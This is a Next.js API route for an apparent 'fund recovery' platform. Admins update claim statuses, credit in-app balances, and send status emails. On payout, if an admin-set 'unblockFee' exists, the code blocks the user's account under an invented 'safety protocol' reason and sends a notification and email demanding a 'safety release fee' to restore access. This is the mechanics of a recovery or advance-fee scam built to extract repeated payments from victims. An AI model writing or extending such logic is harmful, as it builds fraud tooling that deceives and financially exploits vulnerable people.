import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/mongodb';
import RecoveryCase from '@/lib/models/RecoveryCase';
import { sendEmail, emailTemplates } from '@/lib/email';
import { requireAdmin } from '@/middleware/auth';

/** Admin-only. Previously used a hand-rolled cookie check; now on the shared wrapper. */
export const PUT = requireAdmin(async (request, context) => {
  try {
    const { id } = await context.params;
    const body = await request.json();
    const { status, adminNotes, updateMessage, amountClaimed, serviceFee, unblockFee } = body;

    await getDb();
    const recoveryCase = await RecoveryCase.findById(id);
    if (!recoveryCase) return NextResponse.json({ success: false, error: 'Case not found' }, { status: 404 });

    const oldStatus = recoveryCase.status;
    if (status) recoveryCase.status = status;
    if (adminNotes !== undefined) recoveryCase.adminNotes = adminNotes;

    // New fields
    if (amountClaimed !== undefined && amountClaimed !== '') {
      const parsedAmount = parseFloat(amountClaimed);
      if (!isNaN(parsedAmount)) recoveryCase.amountClaimed = parsedAmount;
    }
    if (serviceFee !== undefined && serviceFee !== '') {
      const parsedFee = parseFloat(serviceFee);
      if (!isNaN(parsedFee)) recoveryCase.serviceFee = parsedFee;
    }
    if (unblockFee !== undefined && unblockFee !== '') {
      const parsedUnblockFee = parseFloat(unblockFee);
      if (!isNaN(parsedUnblockFee)) recoveryCase.unblockFee = parsedUnblockFee;
    }

    if (updateMessage) {
      recoveryCase.updates.push({
        status: status || recoveryCase.status,
        message: updateMessage,
        timestamp: new Date()
      });
    }

    // Special Logic for Completion (Payout)
    if (status === 'completed' && oldStatus !== 'completed' && recoveryCase.userId) {
      const db = await getDb();
      const usersCollection = db.collection('users');

      const targetUser = await usersCollection.findOne({ _id: recoveryCase.userId });
      const userName = targetUser ? `${targetUser.firstName} ${targetUser.lastName}` : recoveryCase.email || 'Valued Client';

      const payoutAmount = (recoveryCase.amountClaimed || 0) - (recoveryCase.serviceFee || 0);

      if (payoutAmount > 0) {
        const userUpdate: any = {
          $inc: {
            'balances.main': payoutAmount,
            'balances.total': payoutAmount
          },
          $push: {
            activityLog: {
              action: `Recovery Payout: ${recoveryCase.currency || 'USD'} ${payoutAmount.toLocaleString()} credited from case #${recoveryCase.claimNumber || recoveryCase._id}`,
              timestamp: new Date().toISOString()
            }
          }
        };

        // Apply blocking logic if unblockFee is present
        if (recoveryCase.unblockFee && recoveryCase.unblockFee > 0) {
          userUpdate.$set = {
            isAccountBlocked: true,
            accountBlockReason: `Safety protocol triggered due to large recovery payout (${recoveryCase.currency || 'USD'} ${payoutAmount.toLocaleString()}). Secure unblocking required.`,
            accountUnblockFee: recoveryCase.unblockFee
          };
        }

        await usersCollection.updateOne({ _id: recoveryCase.userId }, userUpdate);

        // Send block notification + email if user was just blocked
        if (recoveryCase.unblockFee && recoveryCase.unblockFee > 0) {
          const db = await getDb();
          const sym = recoveryCase.currency || 'USD';
          await db.collection('notifications').insertOne({
            title: 'ACCOUNT TEMPORARILY BLOCKED',
            message: `Your account has been temporarily blocked after a successful recovery payout of ${sym} ${payoutAmount.toLocaleString()}. Reason: ${userUpdate.$set.accountBlockReason}. A safety release fee of ${sym} ${recoveryCase.unblockFee} is required to restore access.`,
            type: 'account_blocked',
            recipients: [recoveryCase.userId.toString()],
            sentBy: 'admin',
            createdAt: new Date(),
          });

          try {
            const emailTemplate = emailTemplates.accountStatusUpdate(
              userName,
              'block',
              userUpdate.$set.accountBlockReason,
              recoveryCase.unblockFee,
              recoveryCase.currency || 'USD'
            );
            await sendEmail({
              to: recoveryCase.email,
              ...emailTemplate
            });
          } catch (emailError) {
            console.error('Failed to send block-on-recovery email:', emailError);
          }
        }
      }

      // Send Completion Email
      if (recoveryCase.email) {
        const emailOptions = emailTemplates.recoveryClaimCompletion(
          userName,
          recoveryCase.claimNumber || recoveryCase._id.toString(),
          recoveryCase.amountClaimed || 0,
          recoveryCase.serviceFee || 0,
          recoveryCase.currency || 'USD'
        );
        await sendEmail({
          to: recoveryCase.email,
          ...emailOptions
        });
      }
    }

    // Special Logic for Status Change Email Notification
    if (status && status !== oldStatus && recoveryCase.email) {
      const db = await getDb();
      const usersCollection = db.collection('users');
      const targetUser = await usersCollection.findOne({ _id: recoveryCase.userId });
      const userName = targetUser ? `${targetUser.firstName} ${targetUser.lastName}` : recoveryCase.email || 'Valued Client';

      let autoMessage = updateMessage;
      if (!autoMessage) {
        switch (status) {
          case 'approved': autoMessage = 'Your claim has been formally approved for asset repatriation.'; break;
          case 'rejected': autoMessage = 'Unfortunately, your claim has been rejected. Please review any provided notes or contact support.'; break;
          case 'processing': autoMessage = 'Your claim is now being processed by our recovery team.'; break;
          default: autoMessage = `Your claim status has been updated to ${status}.`;
        }
      }

      const emailOptions = emailTemplates.recoveryClaimStatusUpdate(
        userName,
        recoveryCase.claimNumber || recoveryCase._id.toString(),
        status,
        autoMessage
      );
      await sendEmail({
        to: recoveryCase.email,
        ...emailOptions
      });
    }

    if (!recoveryCase.claimNumber) {
      recoveryCase.claimNumber = `REC-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
    }

    await recoveryCase.save();

    return NextResponse.json({ success: true, data: recoveryCase });
  } catch (error) {
    console.error('Admin Recovery PUT error:', error);
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
});

export const DELETE = requireAdmin(async (request, context) => {
  try {
    const { id } = await context.params;

    await getDb();
    const result = await RecoveryCase.findByIdAndDelete(id);
    if (!result) return NextResponse.json({ success: false, error: 'Case not found' }, { status: 404 });

    return NextResponse.json({ success: true, message: 'Case removed' });
  } catch (error) {
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
});
